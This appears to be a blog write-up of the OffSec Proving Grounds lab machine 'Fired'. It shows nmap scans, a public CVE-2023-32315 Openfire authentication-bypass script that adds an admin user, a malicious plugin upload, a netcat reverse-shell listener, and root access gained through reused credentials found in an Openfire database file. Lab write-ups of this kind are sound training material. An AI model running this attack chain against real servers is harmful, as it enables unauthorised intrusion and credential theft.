{"componentChunkName":"component---src-templates-post-template-tsx","path":"/250316/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1. Initial Foothold</h2>\n<p>Starting nmap scan, we found:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hlee㉿kali)-[~]\r\n└─$ sudo nmap 192.168.190.96 -p- -sS -T4                                                             \r\n[sudo] password for hlee: \r\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-03-16 04:45 EDT\r\nNmap scan report for 192.168.190.96\r\nHost is up (0.025s latency).\r\nNot shown: 65532 filtered tcp ports (no-response)\r\nPORT     STATE SERVICE\r\n22/tcp   open  ssh\r\n9090/tcp open  zeus-admin\r\n9091/tcp open  xmltec-xmlmail\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 88.36 seconds\r\n</code></pre></div>\n<p>There are some suspicious ports. Let’s dig deeper.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">PORT     STATE SERVICE             VERSION                                                                          \r\n9090/tcp open  hadoop-tasktracker  Apache Hadoop      \r\n| hadoop-tasktracker-info:                 \r\n|_  Logs: jive-ibtn jive-btn-gradient          \r\n| hadoop-datanode-info:                   \r\n|_  Logs: jive-ibtn jive-btn-gradient               \r\n|_http-title: Site doesn't have a title (text/html).                                                                \r\n9091/tcp open  ssl/hadoop-datanode Apache Hadoop     \r\n| ssl-cert: Subject: commonName=localhost        \r\n| Subject Alternative Name: DNS:localhost, DNS:*.localhost      \r\n| Not valid before: 2024-06-28T07:02:39    \r\n|_Not valid after:  2029-06-27T07:02:39                                                                    \r\n|_ssl-date: TLS randomness does not represent time\r\n|_http-title: Site doesn't have a title (text/html).\r\n| hadoop-datanode-info: \r\n|_  Logs: jive-ibtn jive-btn-gradient\r\n| hadoop-tasktracker-info: \r\n|_  Logs: jive-ibtn jive-btn-gradient</code></pre></div>\n<p>So, it’s hadoop application. (9091 is datanode for 9090 I guess)\r\nI’ve seen it before but can’t quite remember what it was.</p>\n<blockquote>\n<p><strong>Apache Hadoop</strong> is a collection of open-source software utilities for reliable, scalable, <a href=\"https://en.wikipedia.org/wiki/Distributed_computing\" title=\"Distributed computing\" target=\"_blank\" rel=\"nofollow\">distributed computing</a>. It provides a <a href=\"https://en.wikipedia.org/wiki/Software_framework\" title=\"Software framework\" target=\"_blank\" rel=\"nofollow\">software framework</a> for <a href=\"https://en.wikipedia.org/wiki/Clustered_file_system\" title=\"Clustered file system\" target=\"_blank\" rel=\"nofollow\">distributed storage</a>…</p>\n</blockquote>\n<p>Let’s try visiting it.</p>\n<ul>\n<li>port 9090</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/13504146dccda93bf0f037fa034fdab6/f937e/1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 89.58333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACb0lEQVR42q2Ty08TURSHB0hQQOVhhJbSN2Mp0CbGPni1Sp8zfcyUYgtuhKhL/RdMXLiQlQE1BpDEYKILomI0blz4P7ggcWeMxkCICH0AU+bnnZkWQ8SQNkzyZc59nC/33JxLafU0uq02eAY8cLq9cLgG4STQdDc0HUaoNUa0awwEJVa166FSK6jJvFZrht5wnkBDqzODYiM8ovEkuMQYGCaG8HAQoXAUTCSBcDiCkD+EQJCB30f+JB72BeH1XIb3kg+BAAM2mgSfSIHjR8GwHKjOCzy6XSlYHClYnUn0XhxBFxl3ucfR25eC3Z2CrX8MPe4r6HUlSZxGj3MEPX1peY52pEluEkZ7DAZbBFS9nkOdLo56Qp0MJ8e1GhY1KgY1beEi0phFdRtD1qL7++t1MTlu0POEGKgmMwcZUxESN5ri6LCPoat/ApbBm7D0X4el7xphAtaBSXntDNmzn1vKNxJho0kS/KW5M0FOE8SDJ0vYLYhY/foF66s/sL6RweraL+yJIqZmXqLqXAAtdOJAbuNhwhYirG4NYn7xHaRvb+UjNr+v4NvPNWxubslzj56+IUJ/ecK5xfdyciabRzYnkcNWJlO5cL4o3N7eQaFQkGNBUP6PFyoSSiULxylUTpjLS8K94xKKEHIbEHeyEHezELK/FWF5d8iTtglh9tky8Pke8m+vQvhwG8LyLeQXxoFPU5iZXUJVa7lt81wpWbk/UWqgykpuMvM42cEifeMupude4f70C7mRJaT44fxrjE7ewQkNQx4Bf7SwJK0lJVGnhkCd9hykYUhek/b8k/s/YekJnqVHDqX5MNlRwoowxvAHoBPAP5I+KxMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/13504146dccda93bf0f037fa034fdab6/a59e9/1.webp 192w,\n/static/13504146dccda93bf0f037fa034fdab6/0ca9f/1.webp 384w,\n/static/13504146dccda93bf0f037fa034fdab6/dc9b9/1.webp 768w,\n/static/13504146dccda93bf0f037fa034fdab6/20358/1.webp 957w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/13504146dccda93bf0f037fa034fdab6/3b721/1.png 192w,\n/static/13504146dccda93bf0f037fa034fdab6/66595/1.png 384w,\n/static/13504146dccda93bf0f037fa034fdab6/fe486/1.png 768w,\n/static/13504146dccda93bf0f037fa034fdab6/f937e/1.png 957w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/13504146dccda93bf0f037fa034fdab6/fe486/1.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Okay, we have openfire with version number 4.7.3</p>\n<p>I found this site:</p>\n<blockquote>\n<p><a href=\"https://github.com/miko550/CVE-2023-32315\" target=\"_blank\" rel=\"nofollow\">https://github.com/miko550/CVE-2023-32315</a></p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(.venv)─(hlee㉿kali)-[~/oscp/offsec/fired/CVE-2023-32315]\r\n└─$ python CVE-2023-32315.py -t http://192.168.190.96:9090                   \r\n\r\n\r\n ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗\r\n██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝\r\n██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗\r\n██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║\r\n╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║\r\n ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝\r\n                                                                                                       \r\nOpenfire Console Authentication Bypass Vulnerability (CVE-2023-3215)\r\nUse at your own risk!\r\n\r\n[..] Checking target: http://192.168.190.96:9090\r\nSuccessfully retrieved JSESSIONID: node01krifotemwe5269ctv6c229ep49.node0 + csrf: PpM8kjnO9TgY5JQ\r\nUser added successfully: url: http://192.168.190.96:9090 username: vxqw6e password: z4rnpn\r\n</code></pre></div>\n<p>I tried to log in with credential.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/ffbcd46c4dac49e0d7ab90ea7b585a91/22121/2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 94.79166666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC2UlEQVR42pVUy5LTMBDM//8JV4obBw6wsEAVy27Cbuw87NiOLUt+v59pZpQKcEiqFld1jTWWWt2jkRfT6h3iNCHkmE8z/vc5nU6oqgplWaDKIizSxzeIlm9xPPoIAx9K+IiUpHjUkKFALAXqMkdVZGcQwb8oikIjz1IskmCH2HlBxIt9B9Lbw3ct+NYa/v4FMnAR+RZi4SIOPY0kjgnRXyQR0jRGTPlFVpQ4uD5EGGKaZ4zjhLYb0fYU+1Fbeu0z0/pFmqZwHQd5nqPvOqrjCa38AbV7j8j6gEZ8Qi8/Y1AEih2Bx5O60zkeD/Ij5srCNIEsJwlCUte2Dfq+1yo79YA6uEMjv6IJv6IW90RyBo9byk+a+B6VoDniC+bawTidzgp930dd12dC2iZUCeyDD9cT9J5CRRmCMIYvYh0ZQqaoqxRDl2LuEwxtQWvJcpZlmpAL2pFlJizLElEU0ckfqRwudrsdnbwCz80JKbVZVZVI5C+Ex28owu8YKp/ckeVxHMEYhkFHJmyaBlJKTXg4HOC6rt6Ev7MLBs9P1RqH7R2KZImxj+k7Kbx2UkIITcK1VaSMyTl3GbN67ru2tNHXe2CwybI61/Aa4eWgnp+fsV6vsd1udVk4z7aZjGs+dh4wuURooW+IcLxCyJZ5chAEMA0Tm+0GhmFoxZzzPE/Xm4nH9kALbCLcEaG8TcjXiRewNalCbflCwl3BSjm2lSCrPpF56JqELN+oIR+EZVmapCzPd5U34eZnInbQ1A3FhvINyqpFRblpGq8TMhGrYMR0V1kpk7FSrqlt23pTh+A5Nhx7T98z7e7moTAJq8kzpTfgd458QKZpamw2Gzg7g1rnRffnVcJLDdnWBTxu21ZvYpBCbnQmZHLDJFLX03NuKmQl3G+6TdLwj9qQLD/8fMRyucRqtdLx6ekJW9Oga1jRobxK4fm9IYVZrODuTf0z5r7km8QxVQERFprwN4zrpVzoxLuuAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ffbcd46c4dac49e0d7ab90ea7b585a91/a59e9/2.webp 192w,\n/static/ffbcd46c4dac49e0d7ab90ea7b585a91/0ca9f/2.webp 384w,\n/static/ffbcd46c4dac49e0d7ab90ea7b585a91/dc9b9/2.webp 768w,\n/static/ffbcd46c4dac49e0d7ab90ea7b585a91/0a256/2.webp 947w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ffbcd46c4dac49e0d7ab90ea7b585a91/3b721/2.png 192w,\n/static/ffbcd46c4dac49e0d7ab90ea7b585a91/66595/2.png 384w,\n/static/ffbcd46c4dac49e0d7ab90ea7b585a91/fe486/2.png 768w,\n/static/ffbcd46c4dac49e0d7ab90ea7b585a91/22121/2.png 947w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ffbcd46c4dac49e0d7ab90ea7b585a91/fe486/2.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Succeed. This version also includes the file(plugin) upload vulnerability. Let’s upload plugin (following the steps from the link above) and proceed.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/973414ead9b336e1a95908df8c9218e0/b4b29/3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 71.35416666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB5UlEQVR42p1U2W7bMBDU/39LH/vWH+hzYxSJHSOydVGiROrgpYOarmjXQVuhaEpgwBXFHS5nR4rmw2dUvAJvBIAVHx3rusIYA6M13CAQCc5RE9I0Baf5J6qKg+UJ5NMnyJcv0HaEVgqaEn9H3/foug49IaoZJRUXiKYmkiqQlWWJuq7DQTx5Bs/OaOgGTdPsQgjxQCREg4IxaCp7nmdM0wRFlXjv8T8jmuclEI3jGMg2orJnKNoCrGMoCcaa8G7bs8E5h3F6j0PesoQORHsiZ1mGJLlClgnq/BKuvl2Hk659P0BKGaTZ1iShJKm2xmCPcDtGiBpZTk1qKnRDB2U0WFUgZzkG3UN2AlmRktY5ODWiSGKoTu4TriRdqVO8ym+4DC8B6XCk5ycc0q84ywMyd0Y+nnFVz7jYGFn/Ha1i+4R+8ZC2RqGuSFva3MXgwxtyFaNUb6gdVfULMlRjjtaIUMwfhAuJ28qWtGnhrIPVFta4EBtlyYv2tkYwd9xiE/TfJTydXgPSNAEjS8VxjOPxRJqx0AilVYDWN6Oru8ED4eqp3Q94IpypIkMV0cl3u1iKldIUzw+vvtuIbHPHQnJFftRYnMJih9vsNDzN3g1Yl+mvJnaOCA3tMxIz5WwHRx/5CfzLl/IDRnk5nN+7J6EAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/973414ead9b336e1a95908df8c9218e0/a59e9/3.webp 192w,\n/static/973414ead9b336e1a95908df8c9218e0/0ca9f/3.webp 384w,\n/static/973414ead9b336e1a95908df8c9218e0/dc9b9/3.webp 768w,\n/static/973414ead9b336e1a95908df8c9218e0/76153/3.webp 941w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/973414ead9b336e1a95908df8c9218e0/3b721/3.png 192w,\n/static/973414ead9b336e1a95908df8c9218e0/66595/3.png 384w,\n/static/973414ead9b336e1a95908df8c9218e0/fe486/3.png 768w,\n/static/973414ead9b336e1a95908df8c9218e0/b4b29/3.png 941w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/973414ead9b336e1a95908df8c9218e0/fe486/3.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>This machine is slow as hell. I really wanted to use metasploit module, but since this vulnerability was quite interesting, I just waited and waited…\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/78aa1f62f9ca16cc65ac91515faa4f85/a6711/4.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.541666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABaklEQVR42s2Sy07CUBCGz/u/gi/gzlhiCBBA2p5SSo/cLYGVifRCLyxIWNjC75xTQyKC4M5Jvkxn2v+fpDNs8nSHaqOJVruNbrd7EcuyzsI5R6fTURjtBtjU4RiMRnD6fUymUwyHQ4zHYwwGA4yoL/NsNsNyucRisTjLfD6H53mYe69gQbRGFEXwfR9BEKjn9brsxXF8rJMkuYEUrChy5HmOoiiw3++x2+2U0WazORptt1scDgf1/hoMJyGb0rwo9vjIy2Gydy3kQBksjnwk4TuxQhytkFCdrQOkRJYmyLKMSJGmPwnpd0QBaYI3xKQPwxDM6XXh2BKrzFTbFodlGrRBk7BgGFxhmlxtVSI3LLffU1qutLZtg7lC4BuugK7r6ozq9Roq2j1azQfozxqq1UdoWgW1Wh0NOjU5QLy8HLWCYK7r4hJCEK5Np9Ojc3Kodr76QuU+ndqp5lfDEkFCV3H925sM/8b/N/wEvMqRvGkckpYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/78aa1f62f9ca16cc65ac91515faa4f85/a59e9/4.webp 192w,\n/static/78aa1f62f9ca16cc65ac91515faa4f85/0ca9f/4.webp 384w,\n/static/78aa1f62f9ca16cc65ac91515faa4f85/dc9b9/4.webp 768w,\n/static/78aa1f62f9ca16cc65ac91515faa4f85/5112c/4.webp 943w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/78aa1f62f9ca16cc65ac91515faa4f85/3b721/4.png 192w,\n/static/78aa1f62f9ca16cc65ac91515faa4f85/66595/4.png 384w,\n/static/78aa1f62f9ca16cc65ac91515faa4f85/fe486/4.png 768w,\n/static/78aa1f62f9ca16cc65ac91515faa4f85/a6711/4.png 943w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/78aa1f62f9ca16cc65ac91515faa4f85/fe486/4.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Password should be 123 if you followed steps above.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/69c5eaecaeff85d103a37ed9f4f03730/22121/5.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 55.729166666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABSklEQVR42q2SW2+CQBCF9/+/96f0sa1trakgErktTYo3aFWMCtQL99PdVYmxm/jSSb7MYZazzEwg3v0dnlsPeGy9QFUU9Ho9qKra5FsozNPpdPDWbuP99QmE2g4s24au67AsCzbTjuMIfX52XRej0QjD4VCK53knPkHW6zU4q9VKwHUYhlgulw28HscxoigScC0jYpC6rnEZRVGIC5IkFnmz2WC73UIW3HsJDyJ7MUl+4Ps+giA48YXxeNyMNplMxPl0GjDtYzYLcTik8gv5l9I0ZaPFrNsSeV6IzA1B8I35PGS1XNSv4V5y3XZVVdjv99jtdijLsoGvYrFYiDVc1s9kWSa80pHzPGNdHqQ7+ru76khVHTukpg5q9kENDQ7Xhg7XPEJtE5S6DCplYJiwBn18DBTYzGcYBgj/Ma/pcrpdyM5uQTRNw3/yC12PKLzXwrFfAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/69c5eaecaeff85d103a37ed9f4f03730/a59e9/5.webp 192w,\n/static/69c5eaecaeff85d103a37ed9f4f03730/0ca9f/5.webp 384w,\n/static/69c5eaecaeff85d103a37ed9f4f03730/dc9b9/5.webp 768w,\n/static/69c5eaecaeff85d103a37ed9f4f03730/0a256/5.webp 947w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/69c5eaecaeff85d103a37ed9f4f03730/3b721/5.png 192w,\n/static/69c5eaecaeff85d103a37ed9f4f03730/66595/5.png 384w,\n/static/69c5eaecaeff85d103a37ed9f4f03730/fe486/5.png 768w,\n/static/69c5eaecaeff85d103a37ed9f4f03730/22121/5.png 947w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/69c5eaecaeff85d103a37ed9f4f03730/fe486/5.png\"\n            alt=\"image\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Done. Let’s get revshell and continue with privilege escalation.</p>\n<p>I tried a lot for revshell, then busybox(this is the first time I’ve ever used that) gave me a hit.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hlee㉿kali)-[~]\r\n└─$ nc -lvnp 80  \r\nlistening on [any] 80 ...\r\nconnect to [192.168.45.233] from (UNKNOWN) [192.168.190.96] 43900\r\nwhoami\r\nopenfire</code></pre></div>\n<h2>2. Privilege Escalation</h2>\n<p>I had no fun since this was <strong>pure credential hunting</strong>. I couldn’t find any other vector so I just started brute forcing all the scripts and files which might have passwords in it.</p>\n<p>Then, this gave me a hit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">cat /var/lib/openfire/embedded-db/openfire.script</code></pre></div>\n<p>There was root credential in this file, which might have been reused for ssh:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)                                     \r\nINSERT INTO OFPROPERTY VALUES('mail.smtp.port','25',0,NULL)                                                         \r\nINSERT INTO OFPROPERTY VALUES('mail.smtp.ssl','false',0,NULL)                                                       \r\nINSERT INTO OFPROPERTY VALUES('mail.smtp.username','root',0,NULL)   </code></pre></div>\n<p>And yes, it succeed.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">root@openfire:~# whoami\r\nroot</code></pre></div>\n<p>Actually, after looking at other’s writeup, the path to this credential file should have been popped with env command. But in my case (another day of offsec machine I guess), env was empty.</p>\n<p>I really hope that this kind of privesc vector does not show up in the real exam.</p>","frontmatter":{"title":"Proving Grounds : Fired","summary":"Solving Fired machine from Proving Grounds","date":"2025.03.16.","before":"2025.03.15.","after":"2025.03.16.","categories":["proving_grounds","pentest","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACb0lEQVR42q2Ty08TURSHB0hQQOVhhJbSN2Mp0CbGPni1Sp8zfcyUYgtuhKhL/RdMXLiQlQE1BpDEYKILomI0blz4P7ggcWeMxkCICH0AU+bnnZkWQ8SQNkzyZc59nC/33JxLafU0uq02eAY8cLq9cLgG4STQdDc0HUaoNUa0awwEJVa166FSK6jJvFZrht5wnkBDqzODYiM8ovEkuMQYGCaG8HAQoXAUTCSBcDiCkD+EQJCB30f+JB72BeH1XIb3kg+BAAM2mgSfSIHjR8GwHKjOCzy6XSlYHClYnUn0XhxBFxl3ucfR25eC3Z2CrX8MPe4r6HUlSZxGj3MEPX1peY52pEluEkZ7DAZbBFS9nkOdLo56Qp0MJ8e1GhY1KgY1beEi0phFdRtD1qL7++t1MTlu0POEGKgmMwcZUxESN5ri6LCPoat/ApbBm7D0X4el7xphAtaBSXntDNmzn1vKNxJho0kS/KW5M0FOE8SDJ0vYLYhY/foF66s/sL6RweraL+yJIqZmXqLqXAAtdOJAbuNhwhYirG4NYn7xHaRvb+UjNr+v4NvPNWxubslzj56+IUJ/ecK5xfdyciabRzYnkcNWJlO5cL4o3N7eQaFQkGNBUP6PFyoSSiULxylUTpjLS8K94xKKEHIbEHeyEHezELK/FWF5d8iTtglh9tky8Pke8m+vQvhwG8LyLeQXxoFPU5iZXUJVa7lt81wpWbk/UWqgykpuMvM42cEifeMupude4f70C7mRJaT44fxrjE7ewQkNQx4Bf7SwJK0lJVGnhkCd9hykYUhek/b8k/s/YekJnqVHDqX5MNlRwoowxvAHoBPAP5I+KxMAAAAASUVORK5CYII="},"images":{"fallback":{"src":"/static/13504146dccda93bf0f037fa034fdab6/773e3/1.png","srcSet":"/static/13504146dccda93bf0f037fa034fdab6/7ce96/1.png 239w,\n/static/13504146dccda93bf0f037fa034fdab6/5133e/1.png 479w,\n/static/13504146dccda93bf0f037fa034fdab6/773e3/1.png 957w","sizes":"(min-width: 957px) 957px, 100vw"},"sources":[{"srcSet":"/static/13504146dccda93bf0f037fa034fdab6/57bb9/1.webp 239w,\n/static/13504146dccda93bf0f037fa034fdab6/5ede4/1.webp 479w,\n/static/13504146dccda93bf0f037fa034fdab6/1c67b/1.webp 957w","type":"image/webp","sizes":"(min-width: 957px) 957px, 100vw"}]},"width":957,"height":855}},"publicURL":"/static/13504146dccda93bf0f037fa034fdab6/1.png"}}}}]}},"pageContext":{"slug":"/250316/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}